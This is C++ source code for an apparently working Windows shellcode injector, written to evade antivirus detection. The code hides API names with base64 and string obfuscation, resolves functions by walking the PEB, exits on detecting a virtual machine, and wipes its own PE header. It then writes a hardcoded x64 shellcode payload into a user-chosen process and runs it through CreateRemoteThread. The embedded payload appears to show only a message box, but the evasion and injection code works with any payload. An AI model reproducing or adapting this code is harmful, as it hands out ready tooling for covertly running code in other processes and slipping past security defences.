#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <Math.h>
#include "base64.h"
#include "MetaString.h"
#include <iostream>
#include <windows.h>
#include "Processthreadsapi.h"
#include "Libloaderapi.h"
#include <winnt.h>
#include <winternl.h>
#include <Lmcons.h>
#include "Processthreadsapi.h"
#include "Libloaderapi.h"
#include <tlhelp32.h>

#define ADDR unsigned __int64
typedef HMODULE(WINAPI* pGetModuleHandle)(
    LPCSTR lpModuleName
    );

typedef HANDLE(WINAPI* pCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
    );

typedef BOOL(WINAPI* pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef LPVOID(WINAPI* pVirtualAllocExNuma) (
    HANDLE         hProcess,
    LPVOID         lpAddress,
    SIZE_T         dwSize,
    DWORD          flAllocationType,
    DWORD          flProtect,
    DWORD          nndPreferred
);


typedef LPVOID(WINAPI* pVirtualAllocEx) (
    HANDLE         hProcess,
    LPVOID         lpAddress,
    SIZE_T         dwSize,
    DWORD          flAllocationType,
    DWORD          flProtect
);

typedef HANDLE(WINAPI* pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);


 // check if running in  a vm
__forceinline BOOL NotVM() {
    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;
    DWORD procNum;
    DWORD ram;

    // check number of processors
    GetSystemInfo(&s);
    procNum = s.dwNumberOfProcessors;
    if (procNum < 2) return false;

    // check RAM
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
    std::cout << ram << std::endl;
    if (ram < 2) return false;

    return true;
}



// trying to switch to base64 from XOR encoding

std::string StrRemoteThread = base64_decode(OBFUSCATED("Q3JlYXRlUmVtb3RlVGhyZWFk"));
std::string StrVirtualAlloc = base64_decode(OBFUSCATED("VmlydHVhbEFsbG9jRXg="));
std::string StrK32 = base64_decode("a2VybmVsMzIuZGxs");
std::string StrWriteProcessMem = base64_decode("V3JpdGVQcm9jZXNzTWVtb3J5");


BOOL WINAPI bsod() {
    // qeurying ntdll causes av flags
    return (-2);
}

HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA);
ADDR find_dll_base(const char* dll_name);
ADDR find_dll_export(ADDR dll_base, const char* export_name);
// Dynamically finds the base address of a DLL in memory
__forceinline ADDR find_dll_base(const char* dll_name)
{

    PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
    PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;
    PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    // Iterate through every loaded DLL in the current process
    do {
        PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        char* dllName;
        // Convert unicode buffer into char buffer for the time of the comparison, then free it
        UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
        char* result = strstr(dllName, dll_name);
        CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi
        if (result != NULL) {
            // Found the DLL entry in the PEB, return its base address
            return (ADDR)dllEntry->DllBase;
        }
        curr = curr->Flink;
    } while (curr != head);
    return NULL;
}
// Utility function to convert an UNICODE_STRING to a char*
__forceinline HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA)
{
    ULONG cbAnsi, cCharacters;
    DWORD dwError;
    // If input is null then just return the same.
    if (pszW == NULL) {
        *ppszA = NULL;
        return NOERROR;
    }
    cCharacters = wcslen(pszW) + 1;
    cbAnsi = cCharacters * 2;
    *ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
    if (NULL == *ppszA)
        return E_OUTOFMEMORY;
    if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL)) {
        dwError = GetLastError();
        CoTaskMemFree(*ppszA);
        *ppszA = NULL;
        return HRESULT_FROM_WIN32(dwError);
    }
    return NOERROR;
}

__forceinline ADDR find_dll_export(ADDR dll_base, const char* export_name)
{
    // Read the DLL PE header and NT header
    PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
    PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);
    // The RVA of the export table if indicated in the PE optional header
    // Read it, and read the export table by adding the RVA to the DLL base address in memory
    DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);
    // Browse every export of the DLL. For the i-th export:
    // - The i-th element of the name table contains the export name
    // - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
    DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
    WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
    DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);
    for (int i = 0; i < exportTable->NumberOfNames; ++i) {
        char* funcName = (char*)(dll_base + name_table[i]);
        ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
        if (!_strcmpi(funcName, export_name)) {
            return func_ptr;
        }
    }
    return NULL;
}


int main(int argc, char* argv[]){
    using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    using GetModuelHandlePrototype = FARPROC(WINAPI*)(LPCSTR);
    using VirtualProtectPrototype = FARPROC(WINAPI*)(
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
    );


    ADDR kernel32_base = find_dll_base("KERNEL32.DLL");
    GetProcAddressPrototype MyGetProcAddress = (GetProcAddressPrototype)find_dll_export(kernel32_base, OBFUSCATED("GetProcAddress"));
    GetModuelHandlePrototype MyGetModuleHandle = (GetModuelHandlePrototype)find_dll_export(kernel32_base, OBFUSCATED("GetModuleHandleA"));
    VirtualProtectPrototype MyVirtualProtect = (VirtualProtectPrototype)find_dll_export(kernel32_base, OBFUSCATED("VirtualProtect"));

    DWORD OldProtection = NULL;
    auto Status = MyVirtualProtect(MyGetModuleHandle(NULL), 0x1000, PAGE_EXECUTE_READWRITE, &OldProtection);
    if (Status == NULL)
    {
        printf("Failed to change page protections: (%i)", GetLastError());
        return 0;
    }

    auto Result = memset(GetModuleHandle(NULL), NULL, 0x1000);

    if (Result == nullptr)
    {
        printf("Failed to set virtual memory (%i)", GetLastError());
    }
    LPVOID mem = NULL;
    pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)MyGetProcAddress(GetModuleHandle(OBFUSCATED("kernel32.dll")), OBFUSCATED("VirtualAllocExNuma"));
    mem = myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);

    if (NotVM() == false) {
        printf(OBFUSCATED("vm detected quitting"));
        return bsod();
    }
    
    if (mem == NULL) {
        return bsod();
    }

    if (strstr(argv[0], OBFUSCATED("WinKillHaha.exe")) == NULL) {
        printf(OBFUSCATED("How dare you change my name without consent. :( \n"));
        return bsod();
    }


    const char payload[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\
\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\
\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\
\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\
\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f\
\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49\
\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01\
\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\
\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1\
\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41\
\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b\
\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\
\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\
\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\
\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\
\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\
\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\
\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\
\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\
\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e\
\x2e\x2e\x5e\x3d\x00";

   
    // OBFUSCATION GO BRRRRRR
    HMODULE hKernel32 = GetModuleHandle(StrK32.c_str());
 
    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    PVOID rb; // remote buffer


    int pid = 0;
    std::cin >> pid;
    printf(OBFUSCATED("memset\n"));

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    printf(OBFUSCATED("Opened process\n"));

    // Get module handle of kernel32.dll
    
    // use virtualallocex to allocate empty buffer on remote process

    pVirtualAllocEx myVirtualAllocEx = (pVirtualAllocEx)MyGetProcAddress(hKernel32, StrVirtualAlloc.c_str());
    rb = myVirtualAllocEx(ph, NULL, sizeof(payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // copy data to empty buffer on remote  process
    printf("WriteProcMem\n");
    pWriteProcessMemory myWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress(hKernel32, StrWriteProcessMem.c_str());
    myWriteProcessMemory(ph, rb, payload, sizeof(payload), NULL);
    // create remote thread
    pCreateRemoteThread myCreateRemoteThread = (pCreateRemoteThread)MyGetProcAddress(hKernel32, StrRemoteThread.c_str());
    rt = myCreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
    printf(OBFUSCATED("remotethread\n"));
    CloseHandle(ph);

}

